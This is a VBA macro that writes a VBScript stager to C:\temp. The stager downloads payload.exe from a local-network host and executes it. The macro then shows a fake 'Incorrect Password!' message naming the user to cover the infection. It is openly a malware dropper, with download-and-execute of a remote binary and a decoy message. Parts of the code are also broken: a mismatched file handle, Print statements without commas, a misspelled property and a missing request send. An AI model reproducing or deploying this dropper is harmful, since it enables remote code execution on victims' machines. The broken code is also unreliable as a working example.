Sub WritePayload()
    Dim PayloadFile As Integer
    Dim FilePath As String

    PayloadFile = FreeFile
    FilePath = "C:\temp\stagger.vbs"

    Open FilePath For Output As TextFile
    Print #PayloadFile "HTTPDownload('http://192.168.1.20/payload.exe', 'C:\temp')"
    Print #PayloadFile "Sub HTTPDownload(myURL, myPath)"
    Print #PayloadFile "Dim i, strFile, objFile, objFSO, objHTTP, objWShell"
    Print #PayloadFile "Const ForReading=1, ForWriting=2, ForAppending=8"
    Print #PayloadFile "Set objFSO = CreateObject('Scripting.FileSystemObject')"
    Print #PayloadFile "strFile = objFSO.BuildPath(myPath, Mid(myURL, InStrRev(myURL, '/') + 1))"
    Print #PayloadFile "Set objFile = CreateObject(strFile, ForWriting, True)"
    Print #PayloadFile "Set objHTTP = CreateObject('WinHTTP.Request.5.1')"
    Print #PayloadFile "objHTTP.Open('GET', myURL, False)"
    Print #PayloadFile "For(i=1 To LenB(objHTTP.ResponseBody))"
    Print #PayloadFile "objFile.Write Chr(AscB(MidB(objHTTP.ReponseBody, i, 1)))"
    Print #PayloadFile "Next"
    Print #PayloadFile "objFile.Close()"
    Print #PayloadFile "Set WShell = CreateObject('WScript.Shell')"
    Print #PayloadFile "WShell.Run('C:\temp\payload.exe')"
    Print #PayloadFile "End Sub"

    Shell("C:\temp\stagger.vbs")
    MsgBox "Incorrect Password! SysAdmin will be notified following further violations by " & (Environ$("Username"))
End Sub